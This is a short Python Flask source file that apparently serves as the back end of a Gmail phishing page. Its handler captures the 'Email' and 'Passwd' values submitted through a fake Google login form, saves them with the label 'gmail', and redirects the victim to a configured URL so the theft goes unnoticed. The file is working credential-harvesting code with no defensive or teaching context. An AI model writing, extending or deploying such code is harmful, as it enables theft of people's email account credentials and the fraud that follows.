import requests
from flask import request, redirect
from flask_restful import Resource

import config
from utils.users import add_user


class Gmail(Resource):
    def post(self):
        try:
            email = request.form["Email"]
            password = request.form["Passwd"]
            add_user(email, password, "gmail")
            return redirect(config.GMAIL_REDIRECT_URL, code=requests.codes.found)
        except Exception as e:
            print(e.__str__())
